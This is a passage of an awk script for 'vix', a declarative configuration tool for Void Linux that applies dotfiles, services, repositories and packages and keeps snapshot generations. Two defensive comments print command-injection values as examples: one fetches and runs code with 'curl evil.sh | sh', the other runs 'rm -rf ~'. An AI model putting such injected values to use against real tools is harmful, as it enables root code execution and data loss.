                print "\033[31m" "Ошибка: Поколение '" target_arg "' не найдено. Смотрите 'vix list'." "\033[0m"
                exit 1
            }
        }

        if (target_dir == current_dir) {
            print "-> Уже находитесь на этом поколении."
            exit 0
        }

        n = split(target_dir, gpp, "/")

        if (current_dir != "") {
            live_dotfiles_hash = get_dir_hash(DOTFILES)
            cur_gen_dotfiles_hash = get_dir_hash(current_dir "/dotfiles")
            if (live_dotfiles_hash != "" && live_dotfiles_hash != cur_gen_dotfiles_hash) {
                print "-> ВНИМАНИЕ: живые дотфайлы отличаются от последнего зафиксированного поколения."
                print "   Несохранённые (не прогнанные через 'vix switch') изменения будут потеряны безвозвратно."
            }
        }

        print "-> Откатываюсь на поколение: " gpp[n]
        print "-> Восстанавливаю манифесты (дотфайлы, пакеты, сервисы, репозитории) из слепка..."

        if (system("[ -d \"" target_dir "/dotfiles\" ]") == 0) {
            # Слепок в store/ - неизменяемый (444/555). Перед удалением/записью
            # в живую DOTFILES обязательно снимаем read-only, иначе rm -rf не
            # сможет очистить вложенные файлы (Permission denied), и дотфайлы
            # "не меняются" - именно так проявлялся этот баг.
            make_writable(DOTFILES)
            system("find \"" DOTFILES "\" -mindepth 1 -maxdepth 1 -exec rm -rf {} +")
            system("cp -a \"" target_dir "\"/dotfiles/. \"" DOTFILES "\"/ 2>/dev/null")
            # cp -a переносит режим 444/555 из store вместе с содержимым -
            # сразу возвращаем права на запись, чтобы следующий switch/sync/
            # rollback не упёрся в ту же проблему.
            make_writable(DOTFILES)
        }
        if (system("[ -f \"" target_dir "/packages.vix\" ]") == 0) {
            system("rm -f \"" PKG_FILE "\"")
            system("cp -a \"" target_dir "/packages.vix\" \"" PKG_FILE "\"")
            make_writable(PKG_FILE)
        }
        if (system("[ -f \"" target_dir "/services.vix\" ]") == 0) {
            system("rm -f \"" SVC_FILE "\"")
            system("cp -a \"" target_dir "/services.vix\" \"" SVC_FILE "\"")
            make_writable(SVC_FILE)
        }
        if (system("[ -f \"" target_dir "/repo.vix\" ]") == 0) {
            system("rm -f \"" REPO_FILE "\"")
            system("cp -a \"" target_dir "/repo.vix\" \"" REPO_FILE "\"")
            make_writable(REPO_FILE)
        }

        # Папки, добавленные через 'vix add' - восстанавливаем реестр extra.vix
        # и содержимое каждой папки прямо в корень config.vix (как и требуется).
        system("rm -f \"" EXTRA_FILE "\"")
        if (system("[ -f \"" target_dir "/extra.vix\" ]") == 0) {
            system("cp -a \"" target_dir "/extra.vix\" \"" EXTRA_FILE "\"")
            make_writable(EXTRA_FILE)
            while ((getline rb_line < EXTRA_FILE) > 0) {
                if (rb_line == "") continue
                rb_eq = index(rb_line, "=")
                if (rb_eq <= 0) continue
                rb_name = substr(rb_line, 1, rb_eq-1)
                if (!is_safe_name(rb_name)) {
                    print "\033[31m" "  [!] Небезопасное/некорректное имя папки в extra.vix пропущено: " rb_name "\033[0m"
                    continue
                }
                rb_src = target_dir "/extra/" rb_name
                if (system("[ -d " shq(rb_src) " ]") == 0) {
                    rb_dst = VOID_CONFIG "/" rb_name
                    make_writable(rb_dst)
                    system("rm -rf " shq(rb_dst))
                    mkdir_p(rb_dst)
                    system("cp -a " shq(rb_src) "/. " shq(rb_dst) "/ 2>/dev/null")
                    make_writable(rb_dst)
                }
            }
            close(EXTRA_FILE)
        }

        print "-> Манифесты восстановлены. Запускаю конвейер применения..."
        cmd = "switch"
    }

    # --- КОМАНДА: SWITCH (Файл -> Система) ---
    if (cmd == "switch" || cmd == "s") {
        print "=== Конвейер сборки окружения VIX (Файл -> Система) ==="
        
        if (system("[ -d \"" DOTFILES "\" ]") != 0) {
            print "\033[31m" "Ошибка: Папка " DOTFILES " не найдена. Сначала запустите 'vix sync'." "\033[0m"
            exit 1
        }

        # ----------------------------------------------------
        # ШАГ А: ПРОВЕРКА ХЭШЕЙ КОМПОНЕНТОВ
        # ----------------------------------------------------
        print "\n--- [Шаг А: Проверка изменений компонентов] ---"

        # Доп. папки (vix add) - если ни одной не зарегистрировано, весь
        # связанный с ними код (гейт, Шаг Е) просто не появляется.
        has_extra = (system("[ -s \"" EXTRA_FILE "\" ]") == 0)

        # Общий хэш всей конфигурации - используется только для имени слепка
        HASH = compute_combined_hash()

        if (length(HASH) < 10) {
            print "\033[31m" "Ошибка: Не удалось сгенерировать хэш конфигурации." "\033[0m"
            exit 1
        }
        CURRENT_STORE = VOID_STORE "/" HASH

        # Ищем последнее зафиксированное поколение для поэлементного сравнения
        last_store_cmd = "find \"" VOID_STORE "\" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | xargs -r ls -td 2>/dev/null | head -n1"
        last_store_dir = ""
        if ((last_store_cmd | getline last_store_dir) > 0) gsub(/[ \t\r\n]/, "", last_store_dir)
        close(last_store_cmd)

        skip_dotfiles = 0
        skip_services = 0
        skip_repo = 0
        skip_packages = 0
        skip_extra = 0

        if (last_store_dir == "") {
            print "  -> Предыдущих поколений не найдено. Требуется полная синхронизация."
        } else {
            snapshot_machine_id = ""
            if ((getline snapshot_machine_id < (last_store_dir "/.machine_id")) > 0) {
                gsub(/[ \t\r\n]/, "", snapshot_machine_id)
            }
            close(last_store_dir "/.machine_id")

            if (snapshot_machine_id == "" || snapshot_machine_id != MACHINE_ID) {
                # Слепок либо создан до появления метки машины (обновление
                # vix), либо (что важнее) config.vix был целиком перенесён с
                # другой машины - например, склонирован из git при первичной
                # настройке. В обоих случаях реальное состояние ЭТОЙ системы
                # не обязано соответствовать манифестам из последнего слепка,
                # даже если сами манифесты побайтово совпадают. Поэтому
                # намеренно не доверяем сравнению хэшей и форсируем полную
                # синхронизацию (один раз - следующий switch на этой же
                # машине снова будет использовать быстрый путь).
                last_store_dir = ""
                print "  -> Последнее поколение принадлежит другой машине (или создано старой версией vix)."
                print "  -> Пропускать шаги по совпадению манифестов небезопасно - требуется полная синхронизация."
            }
        }

        if (last_store_dir == "") {
            # Сообщение о полной синхронизации уже выведено выше (либо это
            # действительно первый switch, либо машина/версия не совпала).
        } else {
            print "  -> Сравниваю с поколением: " last_store_dir

            cur_dotfiles_hash = get_dir_hash(DOTFILES)
            old_dotfiles_hash = get_dir_hash(last_store_dir "/dotfiles")
            if (cur_dotfiles_hash != "" && cur_dotfiles_hash == old_dotfiles_hash) {
                skip_dotfiles = 1
                print "  -> [Дотфайлы]    без изменений -> Шаг Б будет пропущен"
            } else {
                print "  -> [Дотфайлы]    обнаружены изменения"
            }

            cur_svc_hash = get_file_hash(SVC_FILE)
            old_svc_hash = get_file_hash(last_store_dir "/services.vix")
            if (cur_svc_hash != "" && cur_svc_hash == old_svc_hash) {
                skip_services = 1
                print "  -> [Сервисы]     без изменений -> Шаг В будет пропущен"
            } else {
                print "  -> [Сервисы]     обнаружены изменения"
            }

            cur_repo_hash = get_file_hash(REPO_FILE)
            old_repo_hash = get_file_hash(last_store_dir "/repo.vix")
            if (cur_repo_hash != "" && cur_repo_hash == old_repo_hash) {
                skip_repo = 1
                print "  -> [Репозитории] без изменений -> Шаг Г будет пропущен"
            } else {
                print "  -> [Репозитории] обнаружены изменения"
            }

            cur_pkg_hash = get_file_hash(PKG_FILE)
            old_pkg_hash = get_file_hash(last_store_dir "/packages.vix")
            if (cur_pkg_hash != "" && cur_pkg_hash == old_pkg_hash) {
                skip_packages = 1
                print "  -> [Пакеты]      без изменений -> Шаг Д будет пропущен"
            } else {
                print "  -> [Пакеты]      обнаружены изменения"
            }

            if (has_extra) {
                cur_extra_hash = get_extra_combined_hash(0)
                old_extra_hash = get_extra_combined_hash(1)
                if (cur_extra_hash != "" && cur_extra_hash == old_extra_hash) {
                    skip_extra = 1
                    print "  -> [Доп. папки]  без изменений -> Шаг Е будет пропущен"
                } else {
                    print "  -> [Доп. папки]  обнаружены изменения"
                }
            }
        }

        # Локальный кэш индексов репозиториев XBPS (/var/db/xbps/*-repodata)
        # может быть пустым - например, на только что установленной/
        # перенесённой системе, где 'xbps-install -S' ещё ни разу не
        # запускался. В этом случае xbps-query -R не найдёт НИ ОДНОГО пакета
        # вообще, даже самого обычного - и Шаг Д ошибочно решит, что все
        # пакеты "не найдены в репозиториях". Раньше обновление индексов в
        # Шаге Г запускалось только если менялся сам repo.vix - если он
        # совпадал с уже применённым состоянием (стандартные репозитории
        # Void), индекс так никогда и не скачивался. Проверяем кэш явно и
        # принудительно снимаем skip_repo, если он пуст.
        repo_index_missing = (system("ls /var/db/xbps/*-repodata >/dev/null 2>&1") != 0)
        if (repo_index_missing && skip_repo) {
            print "  -> [Репозитории] локальный кэш индексов XBPS пуст - Шаг Г будет выполнен принудительно."
            skip_repo = 0
        }

        if (last_store_dir != "" && skip_dotfiles && skip_repo && skip_packages && skip_services && (!has_extra || skip_extra)) {
            print "\n-> Все компоненты идентичны последнему поколению."
            print "-> Система полностью соответствует манифестам. Новый слепок не создаётся."
            system("ln -sfn \"" HASH "\" \"" VOID_STORE "/current\"")
            prune_old_generations()
            exit 0
        }

        print "-> Запуск конвейера. Текущий хэш конфигурации: " HASH

        # ----------------------------------------------------
        # ШАГ Б: ФИЗИЧЕСКОЕ ОБНОВЛЕНИЕ ДОТФАЙЛОВ В ХОМЯКЕ
        # ----------------------------------------------------
        if (!skip_dotfiles) {
        print "\n--- [Шаг Б: Синхронизация дотфайлов] ---"
        ln_cmd = "find \"" DOTFILES "\" -maxdepth 1 -type f -name '.*'"
        while ((ln_cmd | getline dotfile) > 0) {
            n = split(dotfile, parts, "/")
            filename = parts[n]
            target_file = USER_HOME "/" filename
            
            if (system("[ -L \"" target_file "\" ]") == 0) {
                system("rm -f \"" target_file "\"")
            }
            
            if (system("cmp -s \"" dotfile "\" \"" target_file "\"") != 0) {
                print "  -> Изменение обнаружено! Обновление дотфайла: " filename
                # На случай, если target_file уже существует и когда-то стал
                # read-only (например, унаследовал права от store) - иначе
                # cp -f молча не сможет перезаписать содержимое.
                system("chmod u+w \"" target_file "\" 2>/dev/null")
                if (system("cp -f \"" dotfile "\" \"" target_file "\"") != 0) {
                    print "\033[31m" "  [!] Не удалось записать " target_file " (ошибка компонента 'дотфайлы')." "\033[0m"
                    print "  -> Делаю sync именно этого файла: возвращаю манифест в соответствие текущему рабочему состоянию системы."
                    system("cp -a \"" target_file "\" \"" dotfile "\" 2>/dev/null")
                    make_writable(dotfile)
                    PIPELINE_HAD_ERRORS = 1
                } else {
                    system("chmod u+wx \"" target_file "\"")
                }
            }
        }
        close(ln_cmd)
        }

        # ----------------------------------------------------
        # ШАГ В: ДЕКЛАРАТИВНАЯ СИНХРОНИЗАЦИЯ СЕРВИСОВ
        # ----------------------------------------------------
        if (!skip_services && system("[ -f \"" SVC_FILE "\" ]") == 0) {
            print "\n--- [Шаг В: Декларативная синхронизация сервисов] ---"
            print "[Анализ манифеста сервисов...]"
            
            delete target_services
            delete seen_services_switch
            current_section = ""

            while ((getline line < SVC_FILE) > 0) {
                gsub(/^[ \t]+|[ \t]+$/, "", line)
                if (line == "") continue
                
                if (line ~ /^#.*var\/service/) { current_section = "var"; continue }
                if (line ~ /^#.*etc\/sv/) { current_section = "etc"; continue }
                if (line ~ /^#/) continue
                
                if (line ~ /=/) {
                    split(line, svc_parts, "[ \t]*=[ \t]*")
                    service = svc_parts[1]
                    status = svc_parts[2]
                    gsub(/[ \t\r\n]/, "", service)
                    gsub(/[ \t\r\n]/, "", status)

                    # КРИТИЧНО: service - строка из services.vix (обычный
                    # текстовый файл, не полностью доверенный ввод - его можно
                    # отредактировать вручную или импортировать из чужого
                    # репозитория с дотфайлами). Раньше она подставлялась
                    # НАПРЯМУЮ в 'sudo ln -s', 'sudo touch', 'sudo rm -f',
                    # 'sudo sv stop' и даже в саму проверку существования
                    # "[ -d /etc/sv/$service ]" - имя вида
                    #   foo"; curl evil.sh | sh #
                    # выполнило бы произвольные команды ОТ ROOT ещё на этапе
                    # самой первой проверки. Валидируем строгим allowlist-ом
                    # ДО любого использования в system().
                    if (!is_safe_name(service)) {
                        print "\033[31m" "  [!] Небезопасное/некорректное имя сервиса в services.vix пропущено: " line "\033[0m"
                        continue
                    }

                    if (system("[ -d /etc/sv/" shq(service) " ]") != 0) {
                        continue
                    }
                    
                    if (service in seen_services_switch) continue
                    seen_services_switch[service] = 1

                    if (current_section == "etc" && status == "true") {
                        resolved_status = "true"
                    } else {
                        resolved_status = status
                    }
                    
                    target_services[service] = resolved_status
                     
                    has_symlink = (system("[ -L /var/service/" shq(service) " ]") == 0)
                    has_down = (system("[ -f /etc/sv/" shq(service) "/down ]") == 0)

                    if (resolved_status == "true") {
                        if (!has_symlink || has_down) {
                            print "  [!] Изменение конфигурации -> Сервис [" service "]: Включение (true)"
                            system("sudo rm -f /etc/sv/" shq(service) "/down")
                            if (!has_symlink) {
                                system("sudo ln -s /etc/sv/" shq(service) " /var/service/")
                            }
                        }
                    } else if (resolved_status == "false" && current_section == "var") {
                        if (!has_symlink || !has_down) {
                            print "  [!] Изменение конфигурации -> Сервис [" service "]: Ограничение автозапуска (false в var)"
                            system("sudo touch /etc/sv/" shq(service) "/down")
                            if (!has_symlink) {
                                system("sudo ln -s /etc/sv/" shq(service) " /var/service/")
                            }
                        }
                    } else if (resolved_status == "false" && current_section == "etc") {
                        if (has_symlink || !has_down) {
                            print "  [!] Изменение конфигурации -> Сервис [" service "]: Отключение и утилизация симлинка (false в etc)"
                            system("sudo touch /etc/sv/" shq(service) "/down")
                            if (has_symlink) {
                                system("sudo rm -f /var/service/" shq(service))
                                system("sudo sv stop " shq(service) " >/dev/null 2>&1")
                            }
                        }
                    }
                }
            }
            close(SVC_FILE)
            
            generate_services_config(SVC_FILE)
            
            sv_clean_cmd = "find /var/service -maxdepth 1 -mindepth 1 -type l"
            while ((sv_clean_cmd | getline active_svc) > 0) {
                sub(".*/", "", active_svc)
                if (!is_safe_name(active_svc)) continue
                if (!(active_svc in target_services)) {
                    print "  [!] Найдено расхождение -> Убираю незадекларированный сервис: " active_svc
                    system("sudo touch /etc/sv/" shq(active_svc) "/down")
                    system("sudo rm -f /var/service/" shq(active_svc))
                    system("sudo sv stop " shq(active_svc) " >/dev/null 2>&1")
                }
            }
            close(sv_clean_cmd)
        }

        # ----------------------------------------------------
        # ШАГ Г: ДЕКЛАРАТИВНЫЕ РЕПОЗИТОРИИ ИЗ ПЛОСКИХ ФАЙЛОВ
        # ----------------------------------------------------
        if (!skip_repo) {
            print "\n--- [Шаг Г: Синхронизация репозиториев XBPS] ---"
            rep_ch = deserialize_repo_all(REPO_FILE)

            repo_step_ok = 1
            if (rep_ch == 1 || repo_index_missing) {
                if (rep_ch == 1) {
                    print "  -> Обнаружены изменения в репозиториях. Принудительно обновляю индексы XBPS..."
                } else {
                    print "  -> Локальный кэш индексов пуст. Скачиваю индексы XBPS..."
                }
                if (system("sudo xbps-install -S") != 0) {
                    print "\033[31m" "  [!] Ошибка: не удалось обновить индексы репозиториев." "\033[0m"
                    PIPELINE_HAD_ERRORS = 1
                    repo_step_ok = 0
                }
            } else {
                print "  -> Изменений в репозиториях не обнаружено."
            }

            # Компонент "репозитории" всегда синхронизируется обратно из
            # фактического состояния /usr/share/xbps.d и /etc/xbps.d - в том
            # числе и при ошибке выше, чтобы repo.vix не остался в
            # промежуточном/поломанном виде, а отражал реально применённое.
            if (!repo_step_ok) {
                print "  -> Синхронизирую repo.vix с фактическим (возможно, частично применённым) состоянием..."
            }
            serialize_repo_all(REPO_FILE)
        }

        # ----------------------------------------------------
        # ШАГ Д: ДЕКЛАРАТИВНАЯ СИНХРОНИЗАЦИЯ ПАКЕТОВ
        # ----------------------------------------------------
        if (!skip_packages && system("[ -f \"" PKG_FILE "\" ]") == 0) {
                print "\n--- [Шаг Д: Декларативная синхронизация пакетов] ---"
                print "[Индексирование установленных пакетов...]"

                delete installed_packages
                local_cache_cmd = "xbps-query -l | awk '{print $2}'"
                while ((local_cache_cmd | getline l_pkg) > 0) {
                    l_pkg_clean = clean_package_name(l_pkg)
                    if (l_pkg_clean != "" && is_safe_name(l_pkg_clean)) installed_packages[l_pkg_clean] = 1
                }
                close(local_cache_cmd)

                print "[Анализ манифеста на предмет расхождений с системой...]"

                delete target_packages
                delete processed_packages
                while ((getline line < PKG_FILE) > 0) {
                    gsub(/^[ \t]+|[ \t]+$/, "", line)
                    if (line == "" || line ~ /^#/) continue

                    current_pkg = clean_package_name(line)

                    # КРИТИЧНО: current_pkg дальше подставляется в 'sudo
                    # xbps-install'/'sudo xbps-remove'. packages.vix - обычный
                    # текстовый файл, который можно отредактировать вручную
                    # или импортировать из чужого репозитория с дотфайлами -
                    # его содержимое не является доверенным. Без этой проверки
                    # строка вида 'vim; rm -rf ~ #' привела бы к выполнению
                    # произвольных команд ОТ ROOT через sudo.
                    if (current_pkg != "" && !is_safe_name(current_pkg)) {
                        print "\033[31m" "  [!] Небезопасное/некорректное имя пакета в packages.vix пропущено: " line "\033[0m"
                        continue
                    }

                    if (current_pkg != "" && !(current_pkg in processed_packages)) {
                        processed_packages[current_pkg] = 1
                        target_packages[current_pkg] = 1
                    }
                }
                close(PKG_FILE)

                # Находим разницу между желаемым (манифест) и фактическим (система) состоянием
                pkgs_to_remove = ""
                for (p in installed_packages) {
                    if (!(p in target_packages)) pkgs_to_remove = pkgs_to_remove " " shq(p)
                }

                pkgs_to_install = ""
                for (p in target_packages) {
                    if (!(p in installed_packages)) {
                        # Проверяем, не удовлетворён ли пакет уже (в т.ч. виртуальный/alternatives,
                        # напр. libGL/libEGL/awk и т.п. - они не попадают в installed_packages
                        # по имени напрямую, но уже предоставлены другим установленным пакетом)
                        already_satisfied_cmd = "xbps-query " shq(p) " >/dev/null 2>&1"
                        if (system(already_satisfied_cmd) == 0) {
                            continue
                        }

                        check_repo = "xbps-query -R " shq(p) " >/dev/null 2>&1"
                        if (system(check_repo) == 0) {
                            pkgs_to_install = pkgs_to_install " " shq(p)
                        } else {
                            print "  -> Пакет [" p "] не найден в репозиториях, пропускаю."
                        }
                    }
                }

                if (pkgs_to_remove == "" && pkgs_to_install == "") {
                    print "  -> Расхождений не найдено, пул пакетов уже синхронизирован."
                } else {
                    pkg_step_ok = 1

                    if (pkgs_to_remove != "") {
                        print "[Транзакция удаления]: Удаление пула пакетов..."
                        if (system("sudo xbps-remove -RfOoy" pkgs_to_remove) != 0) {
                            print "\033[31m" "  [!] Ошибка: xbps-remove завершился с ошибкой." "\033[0m"
                            pkg_step_ok = 0
                        }
                    }

                    if (pkg_step_ok && pkgs_to_install != "") {
                        print "[Транзакция установки]: Установка пула пакетов..."
                        if (system("sudo xbps-install -S -y" pkgs_to_install) != 0) {
                            print "\033[31m" "  [!] Ошибка: xbps-install завершился с ошибкой." "\033[0m"
                            pkg_step_ok = 0
                        }
                    }

                    if (!pkg_step_ok) {
                        print "\033[31m" "  [!] Транзакция пакетов завершилась с ошибкой." "\033[0m"
                        PIPELINE_HAD_ERRORS = 1
                    }

                    # Компонент "пакеты" синхронизируется с фактическим
                    # состоянием системы в любом случае (успех или ошибка) -
                    # так manifest всегда возвращается в рабочее, реально
                    # установленное состояние, а не остаётся с "битым" следом
                    # от неудачной транзакции.
                    print "[Синхронизация packages.vix с фактическим состоянием системы...]"
                    generate_packages_config(PKG_FILE)
                    if (!pkg_step_ok) {
                        print "  -> packages.vix приведён в соответствие РЕАЛЬНО установленным пакетам (транзакция могла примениться частично)."
                        print "  -> Если нужен другой набор - отредактируйте packages.vix и запустите 'vix switch' снова."
                    }
                }
        }

        # ----------------------------------------------------
        # ШАГ Е: ПОЛЬЗОВАТЕЛЬСКИЕ ПАПКИ (vix add)
        # ----------------------------------------------------
        # Появляется только если 'vix add' хотя бы раз использовался.
        if (has_extra && !skip_extra) {
            print "\n--- [Шаг Е: Синхронизация пользовательских папок (vix add)] ---"
            while ((getline ex_line < EXTRA_FILE) > 0) {
                if (ex_line == "") continue
                ex_eq = index(ex_line, "=")
                if (ex_eq <= 0) continue
                ex_name = substr(ex_line, 1, ex_eq-1)
                ex_path = substr(ex_line, ex_eq+1)
                if (!is_safe_name(ex_name)) {
                    print "\033[31m" "  [!] Небезопасное/некорректное имя папки в extra.vix пропущено: " ex_name "\033[0m"
                    continue
                }
                ex_manifest = VOID_CONFIG "/" ex_name

                if (system("[ ! -d " shq(ex_manifest) " ]") == 0) {
                    print "  -> [" ex_name "] пропущена: нет в config.vix/, хотя зарегистрирована в extra.vix"
                    continue
                }

                ex_cur_h = get_dir_hash(ex_manifest)
                ex_live_h = get_dir_hash(ex_path)
                if (ex_cur_h != ex_live_h) {
                    print "  -> Изменение обнаружено! Обновляю: " ex_path
                    make_writable(ex_path)
                    system("mkdir -p " shq(ex_path))
                    system("find " shq(ex_path) " -mindepth 1 -maxdepth 1 -exec rm -rf {} +")
                    system("cp -a " shq(ex_manifest) "/. " shq(ex_path) "/ 2>/dev/null")
                    make_writable(ex_path)
                } else {
                    print "  -> [" ex_name "] уже соответствует манифесту, пропускаю."
                }
            }
            close(EXTRA_FILE)
        }

        # ----------------------------------------------------
        # СБОРКА И ЗАМОРОЗКА СЛЕПКА ПОКОЛЕНИЯ
        # ----------------------------------------------------
        if (PIPELINE_HAD_ERRORS) {
            print "\n--- [Фиксация состояния системы] ---"
            print "\033[31m" "-> В конвейере были ошибки (см. вывод выше)." "\033[0m"
            print "\033[31m" "-> Слепок НЕ фиксируется - система не в полном соответствии с манифестами." "\033[0m"
            print "\033[31m" "-> Указатель 'текущее поколение' не трогаю, исправьте проблему и запустите 'vix switch' снова." "\033[0m"
            exit 1
        }

        # Пересчитываем хэш ПОСЛЕ выполнения всех шагов: Шаги В/Д/Е могут сами
        # переписать services.vix/packages.vix/extra-папки (самокоррекция
        # манифеста под реальное состояние системы) уже после того, как HASH
        # был посчитан в Шаге А. Без пересчёта имя папки в store/ могло бы не
        # соответствовать её фактическому содержимому.
        final_hash = compute_combined_hash()
        if (length(final_hash) >= 10) {
            HASH = final_hash
            CURRENT_STORE = VOID_STORE "/" HASH
        }

        print "\n--- [Фиксация состояния системы] ---"
        print "Текущий хэш поколения: " HASH

        if (system("[ -d \"" CURRENT_STORE "\" ]") == 0) {
            print "-> Такое поколение уже есть в store, переиспользую существующий слепок."
        } else {
            # Атомарная публикация: собираем слепок во временной staging-папке и
            # публикуем через переименование (rename атомарен на одной ФС) - так
            # store/<HASH> либо не существует вовсе, либо существует полностью
            # готовым. Если процесс прервётся посередине - незавершённый staging
            # просто останется мусором рядом, а не "притворится" готовым слепком.
            staging_dir = VOID_STORE "/.staging-" HASH "." PROCINFO["pid"]
            system("rm -rf \"" staging_dir "\"")

            print "Создаем неизменяемый слепок поколения..."
            mkdir_p(staging_dir "/dotfiles")
            system("find \"" DOTFILES "\" -mindepth 1 -maxdepth 1 -exec cp -a {} \"" staging_dir "/dotfiles/\" \\;")

            # Метка машины, на которой сделан этот слепок. Нужна, чтобы на
            # Шаге А отличить "манифест не менялся" от "config.vix целиком
            # перенесён на другую машину, где реального состояния системы,
            # соответствующего манифесту, попросту нет" - см. использование
            # ниже, в вычислении skip_*.
            print MACHINE_ID > (staging_dir "/.machine_id")
            close(staging_dir "/.machine_id")

            if (system("[ -f \"" PKG_FILE "\" ]") == 0) system("cp -a \"" PKG_FILE "\" \"" staging_dir "/\"")
            if (system("[ -f \"" SVC_FILE "\" ]") == 0) system("cp -a \"" SVC_FILE "\" \"" staging_dir "/\"")
            if (system("[ -f \"" REPO_FILE "\" ]") == 0) system("cp -a \"" REPO_FILE "\" \"" staging_dir "/\"")

            if (has_extra) {
                system("cp -a \"" EXTRA_FILE "\" \"" staging_dir "/\"")
                mkdir_p(staging_dir "/extra")
                while ((getline fz_line < EXTRA_FILE) > 0) {
                    if (fz_line == "") continue
                    fz_eq = index(fz_line, "=")
                    if (fz_eq <= 0) continue
                    fz_name = substr(fz_line, 1, fz_eq-1)
                    if (!is_safe_name(fz_name)) continue
                    fz_src = VOID_CONFIG "/" fz_name
                    if (system("[ -d " shq(fz_src) " ]") == 0) {
                        mkdir_p(staging_dir "/extra/" fz_name)
                        system("cp -a " shq(fz_src) "/. " shq(staging_dir "/extra/" fz_name) "/ 2>/dev/null")
                    }
                }
                close(EXTRA_FILE)
            }

            system("find \"" staging_dir "\" -type d -exec chmod 555 {} +")
            system("find \"" staging_dir "\" -type f -exec chmod 444 {} +")

            if (system("mv \"" staging_dir "\" \"" CURRENT_STORE "\" 2>/dev/null") == 0) {
                print "\033[32m" "Слепок успешно зафиксирован: " CURRENT_STORE "\033[0m"
            } else {
                print "\033[31m" "  [!] Не удалось атомарно опубликовать слепок (возможно, гонка с другим процессом)." "\033[0m"
                system("chmod -R u+w \"" staging_dir "\" 2>/dev/null")
                system("rm -rf \"" staging_dir "\"")
            }
        }

        # Универсальный указатель "текущее поколение" - не зависит от загрузчика
        system("ln -sfn \"" HASH "\" \"" VOID_STORE "/current\"")
        print "-> Текущее поколение помечено: " HASH

        prune_old_generations()

        print "\nКонвейер VIX успешно выполнен! Система под тотальным декларативным контролем."
        exit 0
    }
    
    print ""

    print "\033[32m" \
          " ██╗   ██╗ ██╗ ██╗  ██╗\n" \
          " ██║   ██║ ██║ ╚██╗██╔╝\n" \
          " ██║   ██║ ██║  ╚███╔╝ \n" \
          " ╚██╗ ██╔╝ ██║  ██╔██╗ \n" \
          "  ╚████╔╝  ██║ ██╔╝ ██╗\n" \
          "   ╚═══╝   ╚═╝ ╚═╝  ╚═╝" \
          "\033[0m"
    print ""
    print "Доступные команды:"
    print "  sync          Создать/обновить config.vix из текущей системы (дотфайлы, пакеты, сервисы, репо)"
    print "  switch, s     Применить конфигурацию (дотфайлы, сервисы, репозитории, пакеты, доп. папки)"
    print "  add, a        Добавить папку под управление VIX: vix add /путь/к/папке"
    print "  list, l       Список зафиксированных поколений"
    print "  rollback, r   Откат на предыдущее (или указанное) поколение"
    print ""
    print "Использование: vix [команда]"
    exit 1
}

# exit из BEGIN передаёт управление сюда (стандартное поведение awk) - это
# гарантирует снятие блокировки при ЛЮБОМ выходе из скрипта (успех, ошибка,
# ранний exit), а не только при "счастливом" пути.
END {
    release_lock()
}
